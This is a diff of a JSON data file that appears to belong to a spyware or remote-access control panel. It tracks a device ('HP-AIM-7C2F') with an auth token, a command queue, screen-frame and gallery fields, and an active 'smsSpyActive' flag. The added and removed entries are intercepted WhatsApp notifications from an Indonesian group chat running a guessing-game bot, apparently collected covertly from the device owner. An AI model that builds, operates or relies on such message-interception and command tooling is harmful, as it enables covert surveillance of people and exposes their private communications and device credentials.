@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775047107153,
+    "lastSeen": 1775047110134,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13802 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 20:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775047110666
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15967 pesan dari 11 chat",
+        "time": "01/04 20:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775047110565
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13801 pesan): ~ 🕷️",
@@ -4003,22 +4019,6 @@
         "time": "01/04 20:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046511851
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13665 pesan): ~ Bot",
-        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar huruf MA, tangan terluka, dan tanda tanya.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
-        "time": "01/04 20:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046511761
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15835 pesan dari 10 chat",
-        "time": "01/04 20:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046510123
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15967 pesan dari 11 chat",
+        "time": "01/04 20:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775047111710
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13802 pesan): ~ Bot",
+        "content": "❌ Jawaban Salah untuk soal ini. Coba lagi!",
+        "time": "01/04 20:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775047110593
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8048,22 +8064,6 @@
         "time": "01/04 20:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046511836
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13665 pesan): ~ Bot",
-        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar huruf MA, tangan terluka, dan tanda tanya.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
-        "time": "01/04 20:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046511781
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13664 pesan): ~ cewek bauti 👅☝🏻",
-        "content": ". tebakgambar",
-        "time": "01/04 20:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046510464
       }
     ],
     "galleryPhotos": [],
